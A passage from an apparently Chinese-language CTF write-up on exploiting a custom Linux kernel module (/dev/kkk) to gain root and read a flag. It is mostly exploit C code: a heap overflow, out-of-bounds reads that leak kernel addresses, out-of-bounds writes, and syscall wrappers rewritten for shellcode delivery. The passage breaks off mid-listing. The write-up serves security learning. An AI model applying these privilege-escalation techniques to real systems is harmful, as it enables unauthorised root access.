</span><span class="c1"></span>    <span class="n">Update</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">);</span>

    <span class="c1">// getchar();
</span><span class="c1"></span>    <span class="n">r</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="n">Run</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">);</span>    <span class="c1">// trigger encryption, get root.
</span><span class="c1"></span>
    
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] Current UID: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">getuid</span><span class="p">());</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">getuid</span><span class="p">()</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+] Root now!!!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
        <span class="n">getchar</span><span class="p">();</span>
        <span class="kt">char</span> <span class="n">buf2</span><span class="p">[</span><span class="mh">0x10</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;/flag&#34;</span><span class="p">;</span>
        <span class="kt">int</span> <span class="n">tmpfd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">buf2</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">tmpfd</span><span class="o">&lt;</span><span class="mi">0</span><span class="p">){</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[-] Open error...&#34;</span><span class="p">);</span>
            <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="n">read</span><span class="p">(</span><span class="n">tmpfd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span>
        <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></td></tr></table>
</div>
</div><p>其实实在不行将 <code>ptr[17]</code> 指在堆上，并在对应伪造按照 <code>init_cred</code> 原封不动伪造也行。一路做下来反而感觉剩下三种提权的方法更容易，应该也更稳定。没有查到任何伪造 <code>init_cred</code> 的资料，以后还是少伪造这个吧&hellip;暂时也没精力去做细致一点的源码分析看看 <code>cred</code> 结构体这个值到底是什么了&hellip;有空再看看。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://s2.loli.net/2022/07/16/eXnSdaGHsO317PJ.png"
        data-srcset="https://s2.loli.net/2022/07/16/eXnSdaGHsO317PJ.png, https://s2.loli.net/2022/07/16/eXnSdaGHsO317PJ.png 1.5x, https://s2.loli.net/2022/07/16/eXnSdaGHsO317PJ.png 2x"
        data-sizes="auto"
        alt="https://s2.loli.net/2022/07/16/eXnSdaGHsO317PJ.png"
        title="https://s2.loli.net/2022/07/16/eXnSdaGHsO317PJ.png" /></p>
<h4 id="修改-exp">修改 exp</h4>
<p>至此，我们打穿了内核。接下来不要忘了外面还套了一层 parser，所以我们得用 shellcode 来执行 exploit.c 提权，需要对 exp 进行一些修改。</p>
<p>首先，把能删的全删掉，比如打印信息、错误判断等语句。确认无误后进入下一步。</p>
<p>然后，我们需要把函数调用改成内嵌汇编，让它们全部不经过标准库函数（因为要全部转成 shellcode）。比如将 <code>ioctl</code> 改成 <code>__asm_my_ioctl</code> 。这里修饰词均为 static 与 inline。确认无误后进入下一步。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kr">inline</span> <span class="n">ssize_t</span> <span class="nf">__asm_my_ioctl</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">value</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">ssize_t</span> <span class="n">ret</span><span class="p">;</span>
    <span class="k">asm</span> <span class="k">volatile</span><span class="p">(</span>
        <span class="s">&#34;syscall&#34;</span>
        <span class="o">:</span> <span class="s">&#34;=a&#34;</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
        <span class="o">:</span> <span class="s">&#34;0&#34;</span><span class="p">(</span><span class="n">__NR_ioctl</span><span class="p">),</span> <span class="s">&#34;D&#34;</span><span class="p">(</span><span class="n">fd</span><span class="p">),</span> <span class="s">&#34;S&#34;</span><span class="p">(</span><span class="n">cmd</span><span class="p">),</span> <span class="s">&#34;d&#34;</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
        <span class="o">:</span> <span class="s">&#34;rcx&#34;</span><span class="p">,</span> <span class="s">&#34;r11&#34;</span><span class="p">,</span> <span class="s">&#34;memory&#34;</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>最后，避免使用数据段与 .bss 段的常量，把所有变量都放栈上。比如把 <code>open(&quot;/dev/kkk&quot;)</code> 写成 <code>buf[0x10]=&quot;/dev/kkk&quot;; open(buf)</code>。好，改完之后我们的 exploit.c 变成了这个样子，测试一下发现还是能打通。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;asm/unistd.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="k">struct</span> <span class="n">AddParam</span><span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">type</span><span class="p">;</span> <span class="c1">// type and enc
</span><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">key_len</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">data_len</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span> <span class="n">data</span><span class="p">;</span>   
<span class="p">};</span>

<span class="k">struct</span> <span class="n">OtherParam</span><span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">id</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">key_len</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">data_len</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span> <span class="n">data</span><span class="p">;</span>     
<span class="p">};</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="n">ssize_t</span> <span class="nf">__asm_my_ioctl</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">value</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">ssize_t</span> <span class="n">ret</span><span class="p">;</span>
    <span class="k">asm</span> <span class="k">volatile</span><span class="p">(</span>
        <span class="s">&#34;syscall&#34;</span>
        <span class="o">:</span> <span class="s">&#34;=a&#34;</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
        <span class="o">:</span> <span class="s">&#34;0&#34;</span><span class="p">(</span><span class="n">__NR_ioctl</span><span class="p">),</span> <span class="s">&#34;D&#34;</span><span class="p">(</span><span class="n">fd</span><span class="p">),</span> <span class="s">&#34;S&#34;</span><span class="p">(</span><span class="n">cmd</span><span class="p">),</span> <span class="s">&#34;d&#34;</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
        <span class="o">:</span> <span class="s">&#34;rcx&#34;</span><span class="p">,</span> <span class="s">&#34;r11&#34;</span><span class="p">,</span> <span class="s">&#34;memory&#34;</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="n">ssize_t</span> <span class="nf">__asm_my_write</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">buf</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">ssize_t</span> <span class="n">ret</span><span class="p">;</span>
    <span class="k">asm</span> <span class="k">volatile</span><span class="p">(</span>
        <span class="s">&#34;syscall&#34;</span>
        <span class="o">:</span> <span class="s">&#34;=a&#34;</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
        <span class="o">:</span> <span class="s">&#34;0&#34;</span><span class="p">(</span><span class="n">__NR_write</span><span class="p">),</span> <span class="s">&#34;D&#34;</span><span class="p">(</span><span class="n">fd</span><span class="p">),</span> <span class="s">&#34;S&#34;</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="s">&#34;d&#34;</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
        <span class="o">:</span> <span class="s">&#34;rcx&#34;</span><span class="p">,</span> <span class="s">&#34;r11&#34;</span><span class="p">,</span> <span class="s">&#34;memory&#34;</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="n">ssize_t</span> <span class="nf">__asm_my_read</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">buf</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">ssize_t</span> <span class="n">ret</span><span class="p">;</span>
    <span class="k">asm</span> <span class="k">volatile</span><span class="p">(</span>
        <span class="s">&#34;syscall&#34;</span>
        <span class="o">:</span> <span class="s">&#34;=a&#34;</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
        <span class="o">:</span> <span class="s">&#34;0&#34;</span><span class="p">(</span><span class="n">__NR_read</span><span class="p">),</span> <span class="s">&#34;D&#34;</span><span class="p">(</span><span class="n">fd</span><span class="p">),</span> <span class="s">&#34;S&#34;</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="s">&#34;d&#34;</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
        <span class="o">:</span> <span class="s">&#34;rcx&#34;</span><span class="p">,</span> <span class="s">&#34;r11&#34;</span><span class="p">,</span> <span class="s">&#34;memory&#34;</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="n">ssize_t</span> <span class="nf">__asm_my_open</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">buf</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">mode</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">ssize_t</span> <span class="n">ret</span><span class="p">;</span>
    <span class="k">asm</span> <span class="k">volatile</span><span class="p">(</span>
        <span class="s">&#34;syscall&#34;</span>
        <span class="o">:</span> <span class="s">&#34;=a&#34;</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
        <span class="o">:</span> <span class="s">&#34;0&#34;</span><span class="p">(</span><span class="n">__NR_open</span><span class="p">),</span> <span class="s">&#34;D&#34;</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="s">&#34;S&#34;</span><span class="p">(</span><span class="n">mode</span><span class="p">)</span>
        <span class="o">:</span> <span class="s">&#34;rcx&#34;</span><span class="p">,</span> <span class="s">&#34;r11&#34;</span><span class="p">,</span> <span class="s">&#34;memory&#34;</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">Add</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">AddParam</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">__asm_my_ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x6B64</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">Run</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">OtherParam</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span>
<span class="p">{</span>    
    <span class="n">__asm_my_ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x6B6B</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">Update</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">OtherParam</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">__asm_my_ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x6B67</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">Dump</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">OtherParam</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">__asm_my_ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x6B69</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>    
<span class="p">}</span>

<span class="k">static</span> <span class="kr">__inline</span> <span class="nf">my_memset</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">dst</span><span class="p">,</span> <span class="kt">char</span> <span class="n">c</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">){</span>
    <span class="k">while</span><span class="p">(</span><span class="n">len</span><span class="o">--</span><span class="p">)</span>
        <span class="o">*</span><span class="n">dst</span><span class="o">++</span> <span class="o">=</span> <span class="n">c</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">path</span><span class="p">[</span><span class="mh">0x10</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;/dev/kkk&#34;</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">sendbuf</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">recvbuf</span><span class="p">[</span><span class="mh">0x10000</span><span class="p">];</span>
    
    <span class="c1">// printf(&#34;[+] Current UID: %d\n&#34;, getuid());
</span><span class="c1"></span>    <span class="n">my_memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>

    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">__asm_my_open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="c1">// if(fd == -1){
</span><span class="c1"></span>    <span class="c1">//     puts(&#34;[-] open wrong, exit&#34;);
</span><span class="c1"></span>    <span class="c1">//     exit(0);
</span><span class="c1"></span>    <span class="c1">// }
</span><span class="c1"></span>
    <span class="k">struct</span> <span class="n">AddParam</span> <span class="n">a</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">OtherParam</span> <span class="n">r</span><span class="p">;</span>

    <span class="c1">// malloc 1024 - 48 = 0x3D0
</span><span class="c1"></span>
    <span class="n">a</span><span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">key_len</span> <span class="o">=</span> <span class="mh">0x7a</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">data_len</span> <span class="o">=</span> <span class="mh">0x16</span><span class="p">;</span>  <span class="c1">// overflow 2 bits of the key size
</span><span class="c1"></span>    <span class="n">a</span><span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">buf</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">;</span>
    <span class="n">my_memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>

    <span class="n">Add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">a</span><span class="p">);</span>

    <span class="n">a</span><span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">key_len</span> <span class="o">=</span> <span class="mh">0x80</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">data_len</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">;</span>
    <span class="n">a</span><span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">buf</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">;</span>
    <span class="n">my_memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>

    <span class="n">Add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">a</span><span class="p">);</span>

    <span class="n">my_memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">Add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">a</span><span class="p">);</span>


    <span class="n">r</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">Run</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">);</span>  <span class="c1">// trigger overflow
</span><span class="c1"></span>
    <span class="n">r</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">r</span><span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">sendbuf</span><span class="p">;</span>
    <span class="n">r</span><span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="n">recvbuf</span><span class="p">;</span>
    <span class="n">Dump</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">);</span>   <span class="c1">// chunk 1 OOB read, read chunk 2
</span><span class="c1"></span>
    <span class="kt">uint64_t</span> <span class="n">slub_addr</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">recvbuf</span> <span class="o">+</span> <span class="mh">0x98</span><span class="p">);</span>  <span class="c1">// 0xffff888005318b70
</span><span class="c1"></span>    <span class="kt">uint64_t</span> <span class="n">kkk_addr</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">recvbuf</span> <span class="o">+</span> <span class="mh">0xb8</span><span class="p">);</span>   <span class="c1">// 0xffffffffc0000130
</span><span class="c1"></span>
    <span class="kt">uint64_t</span> <span class="n">kkk_fops</span> <span class="o">=</span> <span class="mh">0xffffffffc0001180ul</span> <span class="o">+</span> <span class="n">kkk_addr</span> <span class="o">-</span> <span class="mh">0xffffffffc0000130ul</span><span class="p">;</span>

    <span class="c1">// printf(&#34;[+] slub_addr: 0x%lx\n&#34;, slub_addr);
</span><span class="c1"></span>    <span class="c1">// printf(&#34;[+] kkk_addr: 0x%lx\n&#34;, kkk_addr);
</span><span class="c1"></span>    <span class="c1">// printf(&#34;[+] kkk_fops: 0x%lx\n&#34;, kkk_fops);
</span><span class="c1"></span>

    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">recvbuf</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x80</span><span class="p">;</span>   <span class="c1">// key_len
</span><span class="c1"></span>    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">recvbuf</span> <span class="o">+</span> <span class="mh">0x98</span><span class="p">)</span> <span class="o">=</span> <span class="n">slub_addr</span><span class="p">;</span>   <span class="c1">// key_buf
</span><span class="c1"></span>    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">recvbuf</span> <span class="o">+</span> <span class="mh">0xa0</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x50</span><span class="p">;</span>   <span class="c1">// data_len
</span><span class="c1"></span>    <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">recvbuf</span> <span class="o">+</span> <span class="mh">0xa8</span><span class="p">)</span> <span class="o">=</span> <span class="n">kkk_fops</span><span class="p">;</span>   <span class="c1">// data_buf    
</span><span class="c1"></span>    <span class="n">Update</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">);</span>  <span class="c1">// chunk 1 OOB write, write chunk 2 
</span><span class="c1"></span>
    <span class="n">r</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>   
    <span class="n">Dump</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">);</span> <span class="c1">// dump chunk 2 to leak kkk_fops
